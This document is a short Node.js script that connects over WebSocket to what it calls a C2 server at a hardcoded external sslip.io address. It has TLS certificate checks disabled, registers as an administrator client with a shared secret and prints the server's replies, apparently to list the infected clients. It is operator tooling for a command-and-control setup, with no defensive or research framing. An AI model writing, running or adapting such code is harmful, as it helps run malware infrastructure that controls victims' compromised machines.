const WebSocket = require('ws');
const readline = require('readline');

const SECRET = process.env.SHARED_SECRET || 'mcp-shared-secret-change-me';
const WS_URL = 'wss://89-40-15-214.sslip.io:3102';

// Connect to get client list from server logs
console.log('Connecting to C2 server...');

const ws = new WebSocket(WS_URL, { rejectUnauthorized: false });

ws.on('open', () => {
  console.log('Connected! Registering as admin...');
  ws.send(JSON.stringify({
    type: 'register',
    clientId: 'ADMIN-CLI',
    authSecret: SECRET,
    hostname: 'admin-cli',
    platform: 'Linux',
    arch: 'x64',
    username: 'admin',
    isAdmin: true
  }));
});

ws.on('message', (data) => {
  try {
    const msg = JSON.parse(data.toString());
    console.log('Response:', JSON.stringify(msg, null, 2));
  } catch(e) {
    console.log('Raw:', data.toString());
  }
});

ws.on('error', (err) => console.log('Error:', err.message));
ws.on('close', () => console.log('Disconnected'));

// Keep alive for 5 seconds
setTimeout(() => {
  console.log('Done.');
  ws.close();
  process.exit(0);
}, 5000);
